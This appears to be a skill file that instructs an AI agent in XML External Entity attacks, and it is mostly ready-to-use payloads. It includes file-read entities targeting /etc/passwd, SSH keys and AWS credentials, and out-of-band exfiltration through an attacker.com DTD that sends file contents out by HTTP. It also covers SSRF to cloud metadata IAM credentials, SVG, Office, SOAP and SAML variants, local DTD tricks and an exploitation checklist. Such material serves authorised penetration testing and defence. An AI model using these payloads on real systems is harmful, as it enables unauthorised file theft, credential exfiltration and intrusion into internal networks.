---
name: xxe-xml-external-entity
description: >-
  XXE playbook. Use when XML, SVG, OOXML, SOAP, or parser-driven imports may resolve external entities, files, or internal network resources.
---

# SKILL: XML External Entity (XXE)

## 0. RELATED ROUTING

- [upload-insecure-files](../upload-insecure-files/SKILL.md) for SVG/OOXML upload paths
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) when XXE triggers HTTP fetch

---

## 1. CLASSIC PAYLOAD

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

---

## 2. ATTACK SURFACE

- SOAP endpoints (`text/xml`, `application/soap+xml`)
- REST APIs accepting `application/xml`
- File upload: `.xlsx`, `.docx`, `.pptx`, `.svg`
- RSS/Atom feeds
- Change `Content-Type: application/xml` on JSON POST endpoints

---

## 3. OOB (OUT-OF-BAND) XXE

### Blind detection

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/">]>
<root>&xxe;</root>
```

### OOB file exfiltration via attacker DTD

```xml
<!-- attacker.com/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%exfil;
```

```xml
<!-- payload to target -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&exfiltrate;</root>
```

### Error-based OOB

```xml
<!-- attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///NONEXISTENT/%file;'>">
%eval;
%error;
```

---

## 4. FILE READ TARGETS

```
# Linux:
/etc/passwd
/proc/self/environ      ← env vars (DB creds, API keys)
/proc/self/cmdline
/home/USER/.ssh/id_rsa
/home/USER/.aws/credentials

# Windows:
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\wp-config.php
```

---

## 5. SVG XXE

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="100">
  <text font-size="16">&xxe;</text>
</svg>
```

---

## 6. OFFICE FILE XXE (docx/xlsx)

```bash
unzip original.docx -d extracted/
# Edit word/document.xml: add DOCTYPE + entity
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Use &xxe; in document text
cd extracted && zip -r ../malicious.docx .
```

---

## 7. SOAP XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><getUser><id>&xxe;</id></getUser></soap:Body>
</soap:Envelope>
```

---

## 8. XXE → SSRF

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root>&xxe;</root>
```

---

## 9. XINCLUDE (no DOCTYPE control needed)

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

---

## 10. PROTOCOL HANDLERS

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "http://internal.company.com/admin/">
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "ftp://attacker.com:21/x">
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/info%0d%0a">
```

---

## 11. LOCAL DTD INJECTION (blocked external entities)

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

Common local DTD paths:
```
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/fontconfig/fonts.dtd
C:\Windows\System32\wbem\xml\cim20.dtd
```

---

## 12. SAML XXE

```xml
<!-- Decode SAMLResponse base64, inject DOCTYPE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion>
    <saml:Subject><saml:NameID>&xxe;</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>
<!-- Re-encode to base64 and submit as SAMLResponse -->
```

---

## 13. DETECTION CHECKLIST

```
□ Find XML input (or JSON→XML transformation)
□ Send basic entity: <!ENTITY xxe "test"> → &xxe; → does "test" reflect?
□ File read: SYSTEM "file:///etc/passwd"
□ No reflection → OOB via Collaborator URL
□ OOB hit → set up attacker DTD for exfiltration
□ Try SVG upload with XXE
□ Try Content-Type: application/xml on JSON endpoints
□ Try XInclude if DOCTYPE fails
□ Try local DTD if external entities blocked
```
